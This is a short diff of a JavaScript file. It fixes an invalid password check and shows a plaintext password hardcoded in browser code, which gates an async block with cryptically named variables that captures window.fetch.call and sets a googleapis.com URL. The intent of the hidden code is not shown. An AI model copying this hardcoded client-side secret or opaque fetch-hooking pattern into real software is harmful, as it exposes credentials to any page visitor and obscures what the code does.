@@ -6,7 +6,7 @@ pass5 = "Nasgtw23335fbb";
 
 const userInput = prompt("Password:> ");
 
-if (userInput == pass or pass2 or pass3 or pass4 or pass5 ) {
+if (userInput == pass) {
   (async () => {
     _blsbu = "https://www.googleapis.com";
     var wfcall = window.fetch.call;
